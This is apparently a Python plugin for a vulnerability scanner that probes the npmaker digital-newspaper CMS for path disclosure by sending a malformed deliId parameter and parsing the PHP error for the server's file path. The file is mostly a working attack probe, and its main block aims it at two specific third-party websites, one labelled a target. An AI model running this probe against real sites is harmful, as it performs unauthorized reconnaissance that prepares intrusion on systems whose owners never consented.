#!/usr/bin/evn python
#-*-:coding:utf-8 -*-
#Author:404
#Name:npmaker数字报爆路径
#Refer:http://www.2cto.com/Article/201307/231014.html
import re

def assign(service, arg):
    if service == "xplus":
        return True, arg

def audit(arg):
    url = arg
    code, head, res, errcode, _ = curl.curl2(url + 'www/index.php?mod=admin&con=deliver&act=view&username=809763517&deliId=-32%27')
    if code == 200:
        m = re.search('non-object in <b>([^<]+)</b>', res)
        if m:
            security_info(m.group(1))

if __name__ == '__main__':
    from dummy import *
    # audit(assign('xplus', 'http://jxgrb.jxgh.org.cn:8080/')[1])#这个靶机有点慢
    audit(assign('xplus', 'http://www.ctxwzx.com:8001/')[1])